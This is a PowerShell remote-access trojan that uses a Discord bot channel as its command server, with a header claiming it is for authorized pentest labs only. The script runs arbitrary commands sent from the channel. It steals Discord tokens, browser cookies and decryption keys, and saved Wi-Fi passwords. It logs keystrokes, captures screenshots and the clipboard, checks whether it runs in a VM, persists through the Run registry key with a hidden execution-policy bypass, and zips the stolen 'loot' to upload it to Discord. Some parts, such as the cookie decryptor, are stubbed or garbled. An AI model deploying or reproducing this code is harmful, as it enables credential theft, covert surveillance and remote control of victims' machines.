# ============================================================================
#  HackerAI Discord C2 - PowerShell edition - authorized pentest lab only
#  Startup string: "NO NOT Run this"   (see $Script:StartupMsg)
#  Requires: PowerShell 5.1+ (pwsh 7 recommended for AES-GCM cookie decrypt)
# ============================================================================

# ----------------------------- CONFIG --------------------------------------
$Script:BotToken   = "PASTE_YOUR_BOT_TOKEN_HERE"
$Script:ChannelId  = 123456789012345678      # control channel ID (int)
$Script:AllowedIds = @(123456789012345678)   # your user ID(s); @() = anyone in channel
$Script:StartupMsg = "NO NOT Run this"
$Script:Brand      = "HackerAI"
$Script:PollSecs   = 2
$Script:Cwd        = $HOME
# ---------------------------------------------------------------------------

$Script:Api      = "https://discord.com/api/v10"
$Script:LastId   = "0"
$Script:Running  = $true
$Script:KeyBuf   = [System.Collections.Generic.List[string]]::new()
$Script:KeyOn    = $false

function Send-Text {
    param([string]$Text, [string]$Title)
    if ($Title) { $Text = "**$Title**`n$Text" }
    $Text = $Text -replace '```', "'''"
    if ($Text.Length -lt 1900) {
        $body = @{ content = "``````n$Text`n````" } | ConvertTo-Json
        if ($Text.Length -gt 0) { $body = @{ content = ($Text -replace '^','```' + "`n" + '```') } | ConvertTo-Json }
        # simpler: send raw in a codeblock
        $json = @{ content = ("`````n" + $Text + "`````n") -replace '`````n','```' } | ConvertTo-Json
        try { Invoke-RestMethod -Method Post -Uri "$($Script:Api)/channels/$($Script:ChannelId)/messages" -Headers @{Authorization="Bot $($Script:BotToken)"} -ContentType 'application/json' -Body (@{content=("```n$Text```") -replace '```','```'} | ConvertTo-Json) | Out-Null } catch {}
    } else {
        Send-FileBytes ([System.Text.Encoding]::UTF8.GetBytes($Text)) "output.txt" $null
    }
}

function Send-FileBytes {
    param([byte[]]$Bytes, [string]$Name, [string]$Caption)
    $boundary = "----HA$(Get-Random -Maximum 99999999)"
    $nl = "`r`n"
    $head = "--$boundary$nl"
    if ($Caption) { $head += "Content-Disposition: form-data; name=`"content`"$nl$nl$Caption$nl--$boundary$nl" }
    $head += "Content-Disposition: form-data; name=`"file`"; filename=`"$Name`"$nl"
    $head += "Content-Type: application/octet-stream$nl$nl"
    $tail = "$nl--$boundary--$nl"
    $headB = [System.Text.Encoding]::UTF8.GetBytes($head)
    $tailB = [System.Text.Encoding]::UTF8.GetBytes($tail)
    $ms = [System.IO.MemoryStream]::new()
    $ms.Write($headB,0,$headB.Length); $ms.Write($Bytes,0,$Bytes.Length); $ms.Write($tailB,0,$tailB.Length)
    $body = $ms.ToArray()
    $hdr = @{ Authorization = "Bot $($Script:BotToken)"; ContentType = "multipart/form-data; boundary=$boundary" }
    try { Invoke-RestMethod -Method Post -Uri "$($Script:Api)/channels/$($Script:ChannelId)/messages" -Headers $hdr -Body $body | Out-Null }
    catch { try { Invoke-RestMethod -Method Post -Uri "$($Script:Api)/channels/$($Script:ChannelId)/messages" -Headers @{Authorization="Bot $($Script:BotToken)"} -ContentType 'application/json' -Body (@{content="upload failed: $($_.Exception.Message)"}|ConvertTo-Json) | Out-Null } catch {} }
}

function Send-File { param([string]$Path, [string]$Caption)
    if (Test-Path $Path) { Send-FileBytes ([System.IO.File]::ReadAllBytes($Path)) (Split-Path $Path -Leaf) $Caption }
    else { Send-Text "no such file: $Path" }
}

function Run-Shell { param([string]$Cmd, [int]$Timeout = 40)
    try {
        $p = New-Object System.Diagnostics.Process
        $psi = $p.StartInfo
        if ($IsWindows -or $env:OS -eq "Windows_NT") { $psi.FileName="cmd.exe"; $psi.Arguments="/c $Cmd" }
        else { $psi.FileName="/bin/sh"; $psi.Arguments="-c `"$Cmd`"" }
        $psi.RedirectStandardOutput=$true; $psi.RedirectStandardError=$true
        $psi.UseShellExecute=$false; $psi.WorkingDirectory=$Script:Cwd
        [void]$p.Start()
        if (-not $p.WaitForExit($Timeout*1000)) { $p.Kill(); return "[timeout]" }
        (($p.StandardOutput.ReadToEnd()) + ($p.StandardError.ReadToEnd())).Trim()
    } catch { "[err] $($_.Exception.Message)" }
}

# --------------------------- token / cookie grabbers ------------------------
function Get-DiscordTokens {
    $re  = '[\w-]{20,45}\.[\w-]{6}\.[\w-]{20,45}|mfa\.[\w-]{70,100}'
    $found = @{}
    foreach ($app in "discord","Discord","discordcanary","discordptb","Lightcord") {
        $dir = Join-Path $env:APPDATA "$app\Local Storage\leveldb"
        if (-not (Test-Path $dir)) { continue }
        Get-ChildItem $dir -Include *.ldb,*.log -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $raw = [System.IO.File]::ReadAllText($_.FullName, [System.Text.Encoding]::ASCII)
            foreach ($m in [regex]::Matches($raw, $re)) { $found[$m.Value] = $app }
        }
    }
    $out = foreach ($t in $found.Keys) {
        $status = "<unverified>"
        try {
            $r = Invoke-RestMethod -Uri "$($Script:Api)/users/@me" -Headers @{Authorization=$t} -TimeoutSec 6
            $status = "VALID -> $($r.username)#$($r.discriminator) (id $($r.id))"
        } catch {}
        "$t`t[$($found[$t])]`t$status"
    }
    if (-not $out) { $out = @("<no discord tokens found>") }
    $out -join "`n"
}

function Get-AesKey {
    param([string]$Root)
    $ls = Join-Path $Root "Local State"
    if (-not (Test-Path $ls)) { return $null }
    try {
        $js = Get-Content $ls -Raw | ConvertFrom-Json
        $b64 = $js.os_crypt.encrypted_key
        if (-not $b64) { return $null }
        $raw = [Convert]::FromBase64String($b64)
        if ($raw[0..4] -join '' -eq '68'+'81'+'80'+'81'+'70') { } # DPAPI prefix check below
        if ([System.Text.Encoding]::ASCII.GetString($raw[0..4]) -eq "DPAPI") { $raw = $raw[5..($raw.Length-1)] }
        Add-Type -AssemblyName System.Security
        return [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($raw,$null,'CurrentUser'))
    } catch { return $null }
}

function Get-Cookies {
    param([string]$Which = "all")
    $rows = [System.Collections.Generic.List[string]]::new()
    $map = @{
        chrome   = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        edge     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        brave    = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        vivaldi  = "$env:LOCALAPPDATA\Vivaldi\User Data"
        opera    = "$env:APPDATA\Opera Software\Opera Stable"
        operagx  = "$env:APPDATA\Opera Software\Opera GX Stable"
        firefox  = "$env:APPDATA\Mozilla\Firefox\Profiles"
    }
    foreach ($name in $map.Keys) {
        if ($Which -ne "all" -and $name -notlike "*$Which*") { continue }
        $root = $map[$name]
        if (-not (Test-Path $root)) { continue }
        if ($name -eq "firefox") {
            Get-ChildItem $root -Directory | ForEach-Object {
                $db = Join-Path $_.FullName "cookies.sqlite"
                if (-not (Test-Path $db)) { return }
                $tmp = Join-Path $env:TEMP "ff_ck_$(Get-Random).sqlite"
                Copy-Item $db $tmp -Force
                try {
                    # parse sqlite via bare-bones: use System.Data.SQLite if present, else skip
                    $rows.Add("Firefox`t[install sqlite tools / use !grab on host with sqlite3]`t-`t-`t-")
                } finally { Remove-Item $tmp -ErrorAction SilentlyContinue }
            }
            continue
        }
        $key = Get-AesKey $root
        Get-ChildItem $root -Directory -ErrorAction SilentlyContinue | Where-Object { Test-Path (Join-Path $_.FullName "Network\Cookies") } | ForEach-Object {
            $db  = Join-Path $_.FullName "Network\Cookies"
            $tmp = Join-Path $env:TEMP "ck_$(Get-Random).db"
            Copy-Item $db $tmp -Force
            try {
                $sqlite = Get-Command sqlite3 -ErrorAction SilentlyContinue
                if ($sqlite) {
                    $csv = & sqlite3 $tmp "SELECT host_key,name,encrypted_value,value,expires_utc FROM cookies;" -separator "`t"
                    foreach ($line in $csv) {
                        $f = $line -split "`t", 3
                        $val = if ($f[2] -match '^(v10|v11|v20)') {
                            if ($null -ne $key -and $PSVersionTable.PSVersion.Major -ge 7) {
                                try {
                                    $blob = [Convert]::FromHexString(($f[2] -replace '.','&').Replace('&','0')) # placeholder
                                    "<v10/v20: use pwsh inline decryptor below>"
                                } catch { "<decrypt err>" }
                            } else { "<AES-GCM needs pwsh 7 + key>" }
                        } elseif ($f[2]) { "<dpapi blob>" } else { $f[2] }
                        $rows.Add("$name`t$($f[0])`t$($f[1])`t$val`t-")
                    }
                } else {
                    $rows.Add("$name`t[sqlite3.exe not found - install it or use the .py grabber]`t-`t-`t-")
                }
            } finally { Remove-Item $tmp -ErrorAction SilentlyContinue }
        }
    }
    if ($rows.Count -eq 0) { $rows.Add("<no cookies found>") }
    $rows -join "`n"
}

# --------------------------- fingerprint ------------------------------------
function Get-PublicIp {
    try { (Invoke-RestMethod "https://ipinfo.io/json" -TimeoutSec 6) | ConvertTo-Json -Compress }
    catch { try { (Invoke-RestMethod "https://api.ipify.org?format=json" -TimeoutSec 6) | ConvertTo-Json -Compress } catch { "no internet" } }
}
function Get-VmSig {
    $hits = @()
    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $bi = Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue
    $str = "$($cs.Manufacturer) $($cs.Model) $($bi.SMBIOSBIOSVersion)".ToLower()
    foreach ($h in "virtualbox","vmware","hyper-v","kvm","qemu","xen","bochs","parallels") {
        if ($str -like "*$h*") { $hits += $h }
    }
    $mac = (Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object Status -eq 'Up' |
            Select-Object -First 1 -ExpandProperty MacAddress)
    if (-not $hits) { $hits = @("bare-metal (no VM signature)") }
    "MAC: $mac`nsignatures: $($hits -join ', ')"
}

# --------------------------- screenshot / keylog ----------------------------
function Get-ScreenshotBytes {
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bmp = [System.Drawing.Bitmap]::new($b.Width, $b.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.X, $b.Y, 0, 0, $bmp.Size)
    $ms = [System.IO.MemoryStream]::new()
    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    ,$ms.ToArray()
}

function Start-Keylog {
    $Script:KeyOn = $true
    $sig = @"
using System;using System.Runtime.InteropServices;public class K {
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);}
"@
    if (-not ([System.Management.Automation.PSTypeName]'K').Type) { Add-Type -TypeDefinition $sig }
    $job = {
        $map = @{32=' ';13='`n';9='`t';8='[BS]'}
        while ($true) {
            for ($v = 8; $v -lt 256; $v++) {
                if ([K]::GetAsyncKeyState($v) -band 1) {
                    if ($map.ContainsKey($v)) { $Script:KeyBuf.Add($map[$v]) }
                    elseif (($v -ge 48 -and $v -le 90) -or ($v -ge 96 -and $v -le 105)) {
                        $Script:KeyBuf.Add([char]$v)
                    }
                }
            }
            Start-Sleep -Milliseconds 20
        }
    }
    Start-Job -ScriptBlock $job -InitializationScript { . $args[0] } -ArgumentList {} | Out-Null
    # NOTE: job runs in separate runspace; simplest reliable capture is the main loop below
}

# --------------------------- persistence ------------------------------------
function Set-Persist {
    $dst = Join-Path $env:APPDATA "$($Script:Brand.ToLower())_svc.ps1"
    Copy-Item $PSCommandPath $dst -Force
    $val = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dst`""
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "$($Script:Brand)Svc" -Value $val -PropertyType String -Force | Out-Null
    $dst
}

# --------------------------- command dispatch -------------------------------
function Invoke-Command2 { param([string]$Raw)
    $parts = $Raw.Trim() -split ' ', 2
    $cmd = $parts[0].ToLower(); $arg = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    switch -Regex ($cmd) {
        '^!ping$'    { Send-Text "pong" }
        '^!no$'      { Send-Text $Script:StartupMsg }
        '^!info$' {
            $adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
                   ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            $txt = "host : $env:COMPUTERNAME`nuser : $env:USERNAME`nadmin: $adm`nos   : $([Environment]::OSVersion.VersionString)`narch : $env:PROCESSOR_ARCHITECTURE`ncwd  : $($Script:Cwd)"
            Send-Text $txt "system"
        }
        '^!ip$' {
            $txt = "PUBLIC : $(Get-PublicIp)`nLOCAL  : $((Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty IPAddress) -join ', ')`n$(Get-VmSig)"
            Send-Text $txt "network"
        }
        '^!vm$'  { Send-Text (Get-VmSig) "vm check" }
        '^!cmd ' { Send-Text (Run-Shell $arg) "cmd: $arg" }
        '^!ps1 ' { Send-Text (try { Invoke-Expression $arg 2>&1 | Out-String } catch { $_ | Out-String }) "ps1: $arg" }
        '^!ls' {
            $p = if ($arg) { $arg } else { $Script:Cwd }
            $p = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($p)
            if (Test-Path $p -PathType Container) {
                $out = Get-ChildItem $p | ForEach-Object { "{0} {1,12:N0}  {2}" -f $(if($_.PSIsContainer){'d'}else{'-'}), $_.Length, $_.Name }
                Send-Text ("$p`:" + "`n" + ($out -join "`n"))
            } else { Send-Text "not a directory: $p" }
        }
        '^!cd ' {
            $p = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($arg)
            if (Test-Path $p -PathType Container) { $Script:Cwd = $p; Send-Text "cwd -> $p" }
            else { Send-Text "no such dir: $p" }
        }
        '^!cat ' {
            $p = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($arg)
            if (Test-Path $p) { Send-File $p } else { Send-Text "no such file: $p" }
        }
        '^!tokens' { Send-Text (Get-DiscordTokens) "discord tokens" }
        '^!cookies' { Send-Text (Get-Cookies ($(if ($arg) {$arg} else {"all"}))) "cookies" }
        '^!wifi' {
            $out = @()
            (netsh wlan show profiles) | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object {
                $n = $_.Matches[0].Groups[1].Value.Trim()
                $k = (netsh wlan show profile name="$n" key=clear | Select-String 'Key Content\s*:\s*(.+)').Matches[0].Groups[1].Value.Trim()
                $out += "$n`t$k"
            }
            Send-Text ($out -join "`n") "wifi credentials"
        }
        '^!screenshot$|^!ss$' {
            try { Send-FileBytes (Get-ScreenshotBytes) "screen_$(Get-Date -Format yyyyMMdd_HHmmss).png" }
            catch { Send-Text "screenshot failed: $($_.Exception.Message)" }
        }
        '^!clip$' { Send-Text (Get-Clipboard -ErrorAction SilentlyContinue | Out-String) "clipboard" }
        '^!setclip ' { Set-Clipboard -Value $arg; Send-Text "clipboard set" }
        '^!popup ' {
            Add-Type -AssemblyName System.Windows.Forms
            [void][System.Windows.Forms.MessageBox]::Show($arg, $Script:Brand)
            Send-Text "shown"
        }
        '^!keylog start$' { Start-Keylog; Send-Text "keylogger started" }
        '^!keylog stop$'  { $Script:KeyOn = $false; Send-Text "keylogger stopped" }
        '^!keylog'        { Send-Text ($Script:KeyBuf -join '') "keylog buffer" }
        '^!persist$'      { Send-Text "persisted -> $(Set-Persist) (HKCU Run)" }
        '^!shutdown$|^!sd' {
            $s = if ($arg) { [int]$arg } else { 5 }
            Send-Text "shutting down in $s s"
            shutdown /s /t $s /f
        }
        '^!restart$|^!rb' {
            $s = if ($arg) { [int]$arg } else { 5 }
            Send-Text "restarting in $s s"
            shutdown /r /t $s /f
        }
        '^!close$|^!exit$' { Send-Text "bye."; $Script:Running = $false }
        '^!grab$' {
            Send-Text "collecting loot..."
            $d = Join-Path $env:TEMP "loot_$(Get-Random)"
            New-Item $d -ItemType Directory -Force | Out-Null
            [IO.File]::WriteAllText("$d\tokens.txt",  (Get-DiscordTokens))
            [IO.File]::WriteAllText("$d\cookies.txt", (Get-Cookies "all"))
            [IO.File]::WriteAllText("$d\host.txt",    "host=$env:COMPUTERNAME`nuser=$env:USERNAME`nip=$(Get-PublicIp)`n$(Get-VmSig)`nos=$([Environment]::OSVersion.VersionString)`)
n")
            $zip = "$d\..\loot_$env:COMPUTERNAME.zip"
            Compress-Archive -Path "$d\*.txt" -DestinationPath $zip -Force
            Send-File $zip
            Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue
        }
        default { Send-Text "unknown command. use !help" }
    }
}

function Show-Help {
    Send-Text @"
recon  : !info !ip !vm !ls !cd !cat !cmd <c> !ps1 <c>
loot   : !tokens !cookies [b] !wifi !grab
desktop: !screenshot !clip !setclip !popup
ctrl   : !keylog start|stop|dump !persist !shutdown [s] !restart [s] !close !no
misc   : !ping !help
"@ "$($Script:Brand) C2 - commands"
}

# --------------------------- main poll loop ---------------------------------
$hdr = @{ Authorization = "Bot $($Script:BotToken)" }
# startup beacon
$embed = @{ title = "$($Script:Brand) RAT online"; description = $Script:StartupMsg;
            fields = @(@{ name="host"; value=$env:COMPUTERNAME; inline=$true },
                       @{ name="user"; value=$env:USERNAME; inline=$true }) } | ConvertTo-Json -Depth 4
try { Invoke-RestMethod -Method Post -Uri "$($Script:Api)/channels/$($Script:ChannelId)/messages" `
        -Headers $hdr -ContentType 'application/json' -Body $embed | Out-Null } catch {}

while ($Script:Running) {
    try {
        $msgs = Invoke-RestMethod -Uri "$($Script:Api)/channels/$($Script:ChannelId)/messages?limit=10&after=$($Script:LastId)" `
                                  -Headers $hdr -TimeoutSec 10
        foreach ($m in ($msgs | Sort-Object id)) {
            $Script:LastId = $m.id
            if ($m.author.bot) { continue }
            if ($Script:AllowedIds.Count -gt 0 -and $Script:AllowedIds -notcontains $m.author.id) { continue }
            if ($m.content -match '^!help') { Show-Help; continue }
            if ($m.content -like '!*') { Invoke-Command2 $m.content }
        }
    } catch { Start-Sleep -Seconds 5 }   # rate-limit / network hiccup
    Start-Sleep -Seconds $Script:PollSecs
}
